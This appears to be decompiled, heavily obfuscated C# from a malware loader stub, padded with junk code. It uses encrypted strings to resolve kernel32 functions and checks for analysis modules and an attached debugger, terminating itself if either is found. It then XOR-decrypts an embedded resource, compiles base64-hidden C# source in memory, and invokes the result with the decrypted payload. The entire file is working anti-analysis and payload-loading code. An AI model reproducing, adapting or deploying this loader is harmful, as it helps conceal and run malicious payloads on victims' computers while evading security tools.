using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Ports;
using System.Management;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.CSharp;

public class ikUyACLLThPr
{
	private delegate IntPtr W5(string u5);

	private delegate bool Delegate0(IntPtr y5, ref bool Y5);

	private delegate bool E6(IntPtr intptr_0, UIntPtr uintptr_0, uint uint_0, out uint a6);

	private static IntPtr f6;

	[DllImport("kernel32")]
	private static extern IntPtr GetProcAddress(IntPtr F6, string g6);

	[DllImport("kernel32")]
	private static extern IntPtr LoadLibrary(string h6);

	private unsafe static void i6()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_034b: Unknown result type (might be due to invalid IL or missing references)
		//IL_039b: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0412: Unknown result type (might be due to invalid IL or missing references)
		//IL_041e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0424: Unknown result type (might be due to invalid IL or missing references)
		//IL_0560: Unknown result type (might be due to invalid IL or missing references)
		//IL_0664: Unknown result type (might be due to invalid IL or missing references)
		//IL_07af: Unknown result type (might be due to invalid IL or missing references)
		//IL_07eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_07fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0818: Unknown result type (might be due to invalid IL or missing references)
		//IL_0824: Unknown result type (might be due to invalid IL or missing references)
		//IL_082a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0830: Unknown result type (might be due to invalid IL or missing references)
		//IL_084c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0858: Unknown result type (might be due to invalid IL or missing references)
		//IL_085e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0864: Unknown result type (might be due to invalid IL or missing references)
		//IL_0876: Unknown result type (might be due to invalid IL or missing references)
		//IL_087c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0888: Unknown result type (might be due to invalid IL or missing references)
		//IL_08af: Unknown result type (might be due to invalid IL or missing references)
		//IL_08c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0970: Unknown result type (might be due to invalid IL or missing references)
		//IL_0988: Unknown result type (might be due to invalid IL or missing references)
		//IL_099a: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a11: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a29: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a3a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a40: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b91: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b97: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ccf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ce7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fcb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ff2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ffe: Unknown result type (might be due to invalid IL or missing references)
		//IL_1010: Unknown result type (might be due to invalid IL or missing references)
		//IL_1152: Unknown result type (might be due to invalid IL or missing references)
		//IL_115e: Unknown result type (might be due to invalid IL or missing references)
		//IL_116a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1170: Unknown result type (might be due to invalid IL or missing references)
		//IL_1176: Unknown result type (might be due to invalid IL or missing references)
		//IL_117c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1188: Unknown result type (might be due to invalid IL or missing references)
		//IL_119c: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a3: Expected O, but got Unknown
		//IL_12ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_134e: Unknown result type (might be due to invalid IL or missing references)
		//IL_13b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_13bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_13c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_143c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1442: Unknown result type (might be due to invalid IL or missing references)
		//IL_1476: Unknown result type (might be due to invalid IL or missing references)
		//IL_14a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_14c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_14ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_153c: Unknown result type (might be due to invalid IL or missing references)
		//IL_16a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_16a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_16ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_16ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_16cc: Unknown result type (might be due to invalid IL or missing references)
		new Random();
		new PerformanceCounter();
		new EventLog();
		new Process();
		new Random();
		new ManagementEventWatcher();
		uint num = (uint)Convert.ToInt32(241594.08204716048 - Math.Log10(120794.5));
		new EventLog();
		new ManagementClass();
		new ManagementEventWatcher();
		new ManagementObject();
		new PerformanceCounter();
		num += (uint)Convert.ToInt32(1136830.5 - Math.Abs(378943.5));
		new ManagementClass();
		f6 = LoadLibrary(_003CModule_003E.I5((string)_003CModule_003E.M5()));
		new ManagementObjectSearcher();
		new Ping();
		new Random();
		new FileSystemWatcher();
		_ = (E6)Marshal.GetDelegateForFunctionPointer(GetProcAddress(f6, _003CModule_003E.I5((string)_003CModule_003E.n5())), typeof(E6));
		new ManagementObject();
		new ManagementEventWatcher();
		new ManagementObject();
		new Process();
		new PerformanceCounter();
		new List<uint>();
		new Process();
		new ManagementObjectSearcher();
		new ManagementClass();
		new ManagementEventWatcher();
		new ManagementObjectSearcher();
		string text = _003CModule_003E.I5((string)_003CModule_003E.N5());
		int num2 = Convert.ToInt32(13382.0 - Math.Ceiling(4460.5));
		if ((Convert.ToInt32(120204.0 - Math.Round(40068.0)) ^ Convert.ToInt32(42156.5 + Math.Abs(42156.5))) == Convert.ToInt32(14377.0 + Math.Floor(14376.5)))
		{
			Convert.ToInt32(1.0 + Math.Truncate(1.0));
			num2 = num2 + sizeof(double) - Convert.ToInt32(8927.020566261017 - Math.Cos(4464.0));
		}
		string[] array = new string[num2];
		int num3 = Convert.ToInt32(5634.549904924128 + Math.Log10(2819.0));
		if ((Convert.ToInt32(62511.0 + Math.Floor(62510.5)) ^ Convert.ToInt32(96986.96249680343 - Math.Sqrt(48383.5))) == Convert.ToInt32(18641.0 + Math.Truncate(18641.0)))
		{
			Convert.ToInt32(2.0 + Math.Log10(1.0));
			num3 = num3 + sizeof(double) - Convert.ToInt32(2823.0 + Math.Round(2823.0));
		}
		array[num3] = _003CModule_003E.I5((string)_003CModule_003E.o5());
		int num4 = Convert.ToInt32(4538.0);
		if ((Convert.ToInt32(17451.0 - Math.Ceiling(5817.0)) ^ Convert.ToInt32(93597.0)) == Convert.ToInt32(41080.0 + Math.Floor(41079.5)))
		{
			Convert.ToInt32(2.761594155955765 - Math.Tanh(1.0));
			num4 = num4 + sizeof(double) - Convert.ToInt32(4542.643400564275 + Math.Log10(2273.0));
		}
		string[] array2 = text.Split(array, (StringSplitOptions)num4);
		new ManagementObjectSearcher();
		int num5 = Convert.ToInt32(752253.0 + Math.Tanh(376127.0));
		new List<ulong>();
		new Ping();
		num5 += Convert.ToInt32(196478.0 + Math.Ceiling(196478.5));
		new PerformanceCounter();
		W5 w = (W5)Marshal.GetDelegateForFunctionPointer(GetProcAddress(f6, _003CModule_003E.I5((string)_003CModule_003E.O5())), typeof(W5));
		new PerformanceCounter();
		new ProcessStartInfo();
		new EventLog();
		byte[] array3 = new byte[Convert.ToInt32(464592.0 + Math.Ceiling(464592.0))];
		new Ping();
		try
		{
			Array.Reverse((Array)array3);
		}
		catch
		{
		}
		new ManagementObjectSearcher();
		new ProcessStartInfo();
		new ManagementClass();
		new ManagementEventWatcher();
		string[] array4 = array2;
		int num6 = Convert.ToInt32(9978.0);
		if ((Convert.ToInt32(130642.93479652486 + Math.Cos(65321.5)) ^ 0xE813) == Convert.ToInt32(106848.0 - Math.Floor(35616.0)))
		{
			Convert.ToInt32(2.0);
			num6 = num6 + sizeof(double) - Convert.ToInt32(9989.698361566056 - Math.Log10(4993.0));
		}
		int num7 = num6;
		while (num7 < array4.Length)
		{
			string u = array4[num7];
			if (w(u).ToInt32() != 0)
			{
				I6();
			}
			int num8 = num7;
			int num9 = Convert.ToInt32(9777.0);
			if ((Convert.ToInt32(66022.62860780045 - Math.Tan(33011.5)) ^ 0x15C7B) == Convert.ToInt32(35946.0 - Math.Abs(11982.0)))
			{
				Convert.ToInt32(2.0);
				num9 = num9 + sizeof(double) - Convert.ToInt32(9784.0);
			}
			num7 = num8 + num9;
		}
		new Stack<float>();
		new FileSystemWatcher();
		new FileSystemWatcher();
		new Process();
		new PerformanceCounter();
		int num10 = Convert.ToInt32(11404.0 - Math.Truncate(3801.5));
		if ((Convert.ToInt32(51175.84992584442 + Math.Log(25593.0)) ^ Convert.ToInt32(32625.140498972807 - Math.Tan(16312.0))) == Convert.ToInt32(47223.93027792932 + Math.Log(23617.0)))
		{
			Convert.ToInt32(1.2384058440442351 + Math.Tanh(1.0));
			num10 = num10 + sizeof(double) - Convert.ToInt32(11416.0 - Math.Floor(3805.5));
		}
		bool Y = (byte)num10 != 0;
		new Ping();
		new Ping();
		new Ping();
		new FileSystemWatcher();
		Delegate0 @delegate = (Delegate0)Marshal.GetDelegateForFunctionPointer(GetProcAddress(f6, _003CModule_003E.I5((string)_003CModule_003E.p5())), typeof(Delegate0));
		new ManagementEventWatcher();
		new Random();
		int num11 = Convert.ToInt32(2124058412.0);
		if ((Convert.ToInt32(13818.0 + Math.Truncate(13818.0)) ^ Convert.ToInt32(66136.48055923884 + Math.Log10(33070.5))) == Convert.ToInt32(92589.66551063524 - Math.Log10(46292.5)))
		{
			Convert.ToInt32(2.0);
			num11 = num11 + sizeof(double) - Convert.ToInt32(7732.412513534589 + Math.Log10(3868.0));
		}
		Convert.ToInt32(2124170526.1003683 + Math.Sqrt(1062101558.0));
		int num12 = Convert.ToInt32(2124204265.0);
		if ((Convert.ToInt32(79773.46678921564 - Math.Sqrt(39787.0)) ^ Convert.ToInt32(99261.0)) == Convert.ToInt32(46443.0))
		{
			Convert.ToInt32(1.2384058440442351 + Math.Tanh(1.0));
			num12 = num12 + sizeof(double) - Convert.ToInt32(1736.0 - Math.Ceiling(578.5));
		}
		uint num13 = (uint)(num11 ^ num12);
		new ManagementClass();
		num13 += (uint)Convert.ToInt32(539863.4312495458 - Math.Log10(269929.0));
		@delegate(Process.GetCurrentProcess().Handle, ref Y);
		new ManagementEventWatcher();
		new Random();
		new ManagementEventWatcher();
		new ManagementClass();
		new FileSystemWatcher();
		new ProcessStartInfo();
		if (Y)
		{
			I6();
		}
		new SerialPort();
		new ProcessStartInfo();
		new ManagementObjectSearcher();
		new ManagementObjectSearcher();
		new EventLog();
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(_003CModule_003E.I5((string)_003CModule_003E.P5()));
		new ManagementClass();
		new ProcessStartInfo();
		new SerialPort();
		new ManagementClass();
		new PerformanceCounter();
		new List<float>();
		new Process();
		new ManagementClass();
		new ManagementObject();
		new List<long>();
		new ManagementObject();
		byte[] array5 = new byte[manifestResourceStream.Length];
		new ProcessStartInfo();
		new Stack<long>();
		new Process();
		new SerialPort();
		new ProcessStartInfo();
		new Ping();
		new Stack<ulong>();
		new ManagementEventWatcher();
		new ProcessStartInfo();
		int num14 = Convert.ToInt32(6549.81945241184 - Math.Sin(3274.5));
		if ((Convert.ToInt32(86600.54093166017 - Math.Sin(43300.0)) ^ Convert.ToInt32(31653.0)) == Convert.ToInt32(76273.58131805652 - Math.Log10(38134.5)))
		{
			Convert.ToInt32(1.0 + Math.Floor(1.0));
			num14 = num14 + sizeof(double) - 6557;
		}
		manifestResourceStream.Read(array5, num14, array5.Length);
		new ManagementEventWatcher();
		new ProcessStartInfo();
		new Ping();
		new Ping();
		new ManagementObjectSearcher();
		new ProcessStartInfo();
		new ProcessStartInfo();
		new EventLog();
		new FileSystemWatcher();
		manifestResourceStream.Close();
		byte[] bytes = Encoding.UTF8.GetBytes(_003CModule_003E.I5((string)_003CModule_003E.q5()));
		new ProcessStartInfo();
		new PerformanceCounter();
		new ManagementClass();
		new Process();
		new Stack<char>();
		new FileSystemWatcher();
		new FileSystemWatcher();
		new FileSystemWatcher();
		new PerformanceCounter();
		new ManagementObjectSearcher();
		new ManagementClass();
		new Stack<ulong>();
		new ManagementClass();
		new ManagementObject();
		new List<char>();
		new Ping();
		new Stack<float>();
		new ManagementEventWatcher();
		byte[] array6 = new byte[array5.Length];
		new EventLog();
		new ManagementObjectSearcher();
		new ManagementObject();
		int num15 = Convert.ToInt32(7483.06521733041 - Math.Cos(3742.0));
		if ((Convert.ToInt32(18138.98420921395 - Math.Sqrt(9022.0)) ^ Convert.ToInt32(51666.31113822407 - Math.Sin(25833.0))) == 36782)
		{
			num15 = num15 + sizeof(double) - Convert.ToInt32(7492.0);
		}
		int num16 = num15;
		while (num16 < array5.Length)
		{
			array6[num16] = (byte)(array5[num16] ^ bytes[num16 % bytes.Length]);
			int num17 = num16;
			int num18 = Convert.ToInt32(2381.1628866855112 - Math.Sin(1190.5));
			if ((Convert.ToInt32(34441.0 + Math.Tanh(17221.0)) ^ Convert.ToInt32(26686.0 + Math.Truncate(26685.5))) == Convert.ToInt32(22257.0))
			{
				Convert.ToInt32(3.0 - Math.Truncate(1.0));
				num18 = num18 + sizeof(double) - Convert.ToInt32(3582.0 - Math.Round(1194.0));
			}
			num16 = num17 + num18;
		}
		new SerialPort();
		new SerialPort();
		new PerformanceCounter();
		new ProcessStartInfo();
		new Ping();
		Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
		new ProcessStartInfo();
		new ProcessStartInfo();
		byte[] array7 = new byte[Convert.ToInt32(259459.0 + Math.Round(259458.5))];
		try
		{
			Array.Reverse((Array)array7);
		}
		catch
		{
		}
		try
		{
			int num19 = Convert.ToInt32(1309.0);
			if ((Convert.ToInt32(177769.0 - Math.Floor(59256.5)) ^ Convert.ToInt32(89994.0 - Math.Abs(29998.0))) == Convert.ToInt32(74924.0 + Math.Tanh(37462.5)))
			{
				Convert.ToInt32(2.0 + Math.Log10(1.0));
				num19 = num19 + sizeof(double) - Convert.ToInt32(1316.0 + Math.Tanh(658.5));
			}
			BitConverter.ToInt32(array7, num19);
		}
		catch
		{
		}
		new Ping();
		new Ping();
		new ManagementClass();
		new List<char>();
		new List<uint>();
		new Ping();
		new ManagementEventWatcher();
		try
		{
			Array.Reverse((Array)array7);
		}
		catch
		{
		}
		new ProcessStartInfo();
		new ManagementObjectSearcher();
		List<string> list = new List<string>();
		Convert.ToInt32(1647621958.0000002);
		int num20 = 1647631245;
		if ((Convert.ToInt32(6411.0) ^ 0xB462) == Convert.ToInt32(44403.00768989777 - Math.Log(22196.5)))
		{
			num20 = num20 + sizeof(double) - Convert.ToInt32(9294.115946351165 - Math.Sin(4647.5));
		}
		Convert.ToInt32(1647321269.0);
		int num21 = Convert.ToInt32(1647329702.0772097 - Math.Sin(823664851.0));
		if ((Convert.ToInt32(23931.0) ^ Convert.ToInt32(89540.05621814133 - Math.Cos(44770.5))) == Convert.ToInt32(65730.51670720681 - Math.Log10(32863.0)))
		{
			Convert.ToInt32(3.0 - Math.Abs(1.0));
			num21 = num21 + sizeof(double) - 8441;
		}
		long num22 = num20 ^ num21;
		new Ping();
		new Process();
		new ProcessStartInfo();
		num22 += Convert.ToInt32(286126.98743365356 - Math.Sqrt(142874.5));
		num22 += Convert.ToInt32(323364.0 - Math.Tanh(161681.5));
		Assembly[] array8 = assemblies;
		int num23 = Convert.ToInt32(6435.0 + Math.Tanh(3218.0));
		if ((Convert.ToInt32(99761.06503737291 - Math.Sin(49881.0)) ^ Convert.ToInt32(39561.0)) == Convert.ToInt32(73535.56544047662 - Math.Log10(36765.5)))
		{
			Convert.ToInt32(2.5403023058681398 - Math.Cos(1.0));
			num23 = num23 + sizeof(double) - Convert.ToInt32(9666.0 - Math.Round(3222.0));
		}
		int num24 = num23;
		while (num24 < array8.Length)
		{
			Assembly assembly = array8[num24];
			if (!assembly.IsDynamic)
			{
				list.Add(assembly.Location);
			}
			int num25 = num24;
			int num26 = Convert.ToInt32(5804.0);
			if ((Convert.ToInt32(25140.5 + Math.Abs(25140.5)) ^ Convert.ToInt32(61464.87023324492 + Math.Cos(30732.5))) == Convert.ToInt32(6712.0 + Math.Floor(6712.0)))
			{
				Convert.ToInt32(3.0 - Math.Sqrt(1.0));
				num26 = num26 + sizeof(double) - Convert.ToInt32(5811.0);
			}
			num24 = num25 + num26;
		}
		new PerformanceCounter();
		new ManagementClass();
		new FileSystemWatcher();
		string[] array9 = list.ToArray();
		new ProcessStartInfo();
		new Random();
		new ManagementObject();
		new Random();
		ICodeCompiler val = ((CodeDomProvider)new CSharpCodeProvider()).CreateCompiler();
		new Ping();
		new ManagementClass();
		Convert.ToInt32(1640818239.9652183 + Math.Sqrt(820423441.5));
		int num27 = Convert.ToInt32(1640854368.2300534 - Math.Sin(820427184.5));
		if ((Convert.ToInt32(24351.0) ^ Convert.ToInt32(89182.0)) == Convert.ToInt32(66368.0102355922 - Math.Cos(33184.5)))
		{
			Convert.ToInt32(0.4425922753450977 + Math.Tan(1.0));
			num27 = num27 + sizeof(double) - Convert.ToInt32(7494.0);
		}
		int num28 = Convert.ToInt32(820503505.5 + Math.Abs(820503505.5));
		if ((Convert.ToInt32(47869.91669402089 + Math.Log(23940.0)) ^ Convert.ToInt32(58865.0)) == Convert.ToInt32(36469.5 - Math.Abs(12156.5)))
		{
			Convert.ToInt32(2.8414709848078967 - Math.Sin(1.0));
			num28 = num28 + sizeof(double) - Convert.ToInt32(4983.0);
		}
		byte[] array10 = new byte[num27 ^ num28];
		new PerformanceCounter();
		new Process();
		new ManagementObject();
		new List<double>();
		new ManagementObjectSearcher();
		new ManagementClass();
		new ManagementClass();
		new PerformanceCounter();
		new ProcessStartInfo();
		new EventLog();
		try
		{
			Array.Reverse((Array)array10);
		}
		catch
		{
		}
		CompilerParameters val2 = new CompilerParameters(array9);
		int num29 = Convert.ToInt32(5160.936148328375 - Math.Tan(2580.0));
		if ((Convert.ToInt32(127606.0) ^ Convert.ToInt32(43429.0 + Math.Floor(43429.0))) == 41276)
		{
			num29 = num29 + sizeof(double) - Convert.ToInt32(5166.103928669939 + Math.Sin(2583.5));
		}
		val2.set_GenerateInMemory((byte)num29 != 0);
		int num30 = Convert.ToInt32(4315.977758872834 + Math.Tan(2157.5));
		if ((Convert.ToInt32(52166.0 + Math.Round(52166.0)) ^ Convert.ToInt32(58085.0 - Math.Ceiling(19361.5))) == Convert.ToInt32(32872.0 + Math.Floor(32871.5)))
		{
			Convert.ToInt32(1.4596976941318602 + Math.Cos(1.0));
			num30 = num30 + sizeof(double) - Convert.ToInt32(6485.0 - Math.Ceiling(2161.5));
		}
		val2.set_GenerateExecutable((byte)num30 != 0);
		CompilerParameters val3 = val2;
		string text2 = _003CModule_003E.I5((string)_003CModule_003E.Q5());
		new SerialPort();
		text2 += Convert.ToInt32(827679.0 - Math.Floor(275893.0));
		text2 += Convert.ToInt32(895553.9879348644 + Math.Log(447783.5));
		new Ping();
		new EventLog();
		new List<float>();
		new List<long>();
		text2 += Convert.ToInt32(831408.9984496143 + Math.Sqrt(416027.0));
		CompilerResults val4 = val.CompileAssemblyFromSource(val3, Encoding.UTF8.GetString(Convert.FromBase64String(_003CModule_003E.I5((string)_003CModule_003E.r5()))));
		new Random();
		new ManagementObject();
		new ManagementClass();
		new SerialPort();
		int num31 = Convert.ToInt32(490845.0 + Math.Floor(490845.0));
		num31 += Convert.ToInt32(610533.2405586514 + Math.Sqrt(305543.0));
		new Stack<int>();
		new Ping();
		new ProcessStartInfo();
		num31 += Convert.ToInt32(266731.19910625357 + Math.Log(133371.5));
		new PerformanceCounter();
		new EventLog();
		Assembly compiledAssembly = val4.get_CompiledAssembly();
		new Random();
		int num32 = Convert.ToInt32(334269.0 + Math.Ceiling(334269.0));
		new ManagementEventWatcher();
		new FileSystemWatcher();
		new Ping();
		new Process();
		num32 += Convert.ToInt32(358480.0);
		new ProcessStartInfo();
		new Stack<uint>();
		new ManagementObject();
		Type type = compiledAssembly.GetType(_003CModule_003E.I5((string)_003CModule_003E.R5()));
		new ManagementObjectSearcher();
		string text3 = _003CModule_003E.I5((string)_003CModule_003E.s5());
		text3 += Convert.ToInt32(476958.0 + Math.Round(476958.0));
		new ManagementClass();
		new Process();
		new FileSystemWatcher();
		new FileSystemWatcher();
		new ProcessStartInfo();
		MethodInfo method = type.GetMethod(_003CModule_003E.I5((string)_003CModule_003E.S5()));
		new Process();
		new FileSystemWatcher();
		new ManagementObjectSearcher();
		int num33 = 8791;
		if ((Convert.ToInt32(28627.10951798206 - Math.Tan(14315.0)) ^ Convert.ToInt32(119137.0 - Math.Floor(39712.5))) == Convert.ToInt32(88681.32237161082 - Math.Sqrt(44235.5)))
		{
			Convert.ToInt32(3.5574077246549023 - Math.Tan(1.0));
			num33 = num33 + sizeof(double) - Convert.ToInt32(8798.717712259817 - Math.Cos(4399.0));
		}
		object[] array11 = new object[num33];
		int num34 = Convert.ToInt32(4918.190864601879 + Math.Log(2463.0));
		if ((Convert.ToInt32(13611.824898455074 - Math.Log(6801.5)) ^ Convert.ToInt32(94268.32664266803 + Math.Log10(47136.5))) == Convert.ToInt32(83298.0))
		{
			Convert.ToInt32(3.0 - Math.Truncate(1.0));
			num34 = num34 + sizeof(double) - Convert.ToInt32(2467.0 + Math.Abs(2467.0));
		}
		array11[num34] = array6;
		method.Invoke(null, array11);
		new ManagementObjectSearcher();
		new ManagementObject();
		new EventLog();
		new ProcessStartInfo();
		new ManagementObjectSearcher();
		new Process();
		new Ping();
		new ManagementClass();
		new Random();
		new FileSystemWatcher();
		new Random();
	}

	private unsafe static void I6()
	{
		try
		{
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			int num = Convert.ToInt32(-6719.0);
			if ((Convert.ToInt32(156354.35192857755 - Math.Sqrt(78037.5)) ^ Convert.ToInt32(436800.7058867157 + Math.Log(218406.5))) == Convert.ToInt32(314342.0))
			{
				Convert.ToInt32(1.0 + Math.Truncate(1.0));
				num = num + sizeof(double) + Convert.ToInt32(6719.118356069598 - Math.Log(3355.5));
			}
			Environment.Exit(num);
		}
	}
}
